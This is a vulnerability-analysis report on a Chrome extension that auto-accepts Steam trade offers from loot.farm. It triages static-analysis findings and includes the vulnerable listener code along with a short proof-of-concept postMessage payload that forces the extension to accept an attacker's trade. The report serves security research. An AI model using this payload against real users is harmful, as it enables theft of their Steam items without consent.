# CoCo Analysis: iljnangbjcpnopeaebpckiljkapfcakl

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: XMLHttpRequest_responseText_source → XMLHttpRequest_post_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/iljnangbjcpnopeaebpckiljkapfcakl/opgen_generated_files/bg.js
Line 1004	partner = xmlhttp.responseText.substr(partnerPos, 17);
Line 1006	sessionid = xmlhttp.responseText.substr(sessPos, 24);
Line 1008	let PostData = "sessionid=" + sessionid + "&serverid=1&partner=" + partner + "&tradeofferid=" + tradeOffer + '&captcha=';
```

**Classification:** FALSE POSITIVE

**Reason:** This flow is XMLHttpRequest response from steamcommunity.com being parsed and used in another XMLHttpRequest POST. While the tradeOffer parameter comes from attacker (see Sink 3), this specific detection tracks data from response to POST body, which is data from Steam's response being sent back to Steam. This is not itself a vulnerability - the vulnerability is in Sink 3.

---

## Sink 2: XMLHttpRequest_responseText_source → XMLHttpRequest_post_sink

Same as Sink 1 (duplicate detection).

**Classification:** FALSE POSITIVE

---

## Sink 3: cs_window_eventListener_message → XMLHttpRequest_url_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/iljnangbjcpnopeaebpckiljkapfcakl/opgen_generated_files/cs_0.js
Line 480	window.addEventListener("message", function(event) {
Line 488	if (event.data.type && (event.data.type === "ACCEPT_GIFT")) {
Line 493	SendTradeMessage(event.data.tradeid, event.data.offerid);

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/iljnangbjcpnopeaebpckiljkapfcakl/opgen_generated_files/bg.js
Line 994	let url = "https://steamcommunity.com/tradeoffer/"+tradeOffer;
```

**Code:**

```javascript
// Content script (cs_0.js) - Lines 480-495, injected into https://loot.farm/*
window.addEventListener("message", function(event) {
    // We only accept messages from ourselves
    if (event.source !== window) // Accepts messages from same window context
        return;

    if (event.origin !== "https://loot.farm") // Origin check (but attacker controls loot.farm page)
        return;

    if (event.data.type && (event.data.type === "ACCEPT_GIFT")) {
        SendTradeMessage(event.data.tradeid, event.data.offerid); // ← attacker-controlled
    }
});

function SendTradeMessage(divID, tradeId) {
    chrome.runtime.sendMessage({LOOTFarmAcceptOffer: tradeId}, function(statusAns) { // ← sends to background
        // ...
    });
}

// Background script (bg.js) - Lines 991-1033
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if(request.LOOTFarmAcceptOffer > 0 &&
       (sender.tab.url === 'https://loot.farm' || sender.tab.url.startsWith('https://loot.farm/'))) {
        let tradeOffer = request.LOOTFarmAcceptOffer; // ← attacker-controlled trade ID
        let url = "https://steamcommunity.com/tradeoffer/"+tradeOffer; // ← attacker controls URL
        let xmlhttp = new XMLHttpRequest();
        xmlhttp.open("GET", url, true); // Privileged request to attacker-controlled trade URL
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState === 4 && xmlhttp.status === 200) {
                let partner = xmlhttp.responseText.substr(partnerPos, 17);
                let sessionid = xmlhttp.responseText.substr(sessPos, 24);
                // Constructs POST to accept trade
                let PostData = "sessionid=" + sessionid + "&serverid=1&partner=" + partner +
                               "&tradeofferid=" + tradeOffer + '&captcha=';
                let tradeUrl = "https://steamcommunity.com/tradeoffer/"+ tradeOffer + "/accept";
                let xmlTrade = new XMLHttpRequest();
                xmlTrade.open("POST", tradeUrl, true); // Accepts arbitrary trade
                xmlTrade.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xmlTrade.send(PostData); // Sends privileged POST to accept trade
            }
        };
        xmlhttp.send();
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage listener in content script

**Attack:**

```javascript
// Malicious script on https://loot.farm page
// Tricks user's extension into accepting attacker's trade offer
window.postMessage({
    type: "ACCEPT_GIFT",
    tradeid: "123",
    offerid: "7656119812345678_7890123456" // Attacker's Steam trade offer ID
}, "*");
```

**Impact:** Privileged cross-origin request vulnerability. An attacker who controls or compromises the loot.farm website can force the extension to accept arbitrary Steam trade offers on behalf of the user. The extension makes authenticated requests to steamcommunity.com using the user's Steam session, automatically accepting trades without user consent. This allows the attacker to steal the user's Steam items by creating malicious trade offers and forcing the extension to accept them. The content script is injected into loot.farm pages (per manifest line 13), and since `event.source === window` check passes for postMessage from the webpage context, the attacker webpage can trigger this flow.
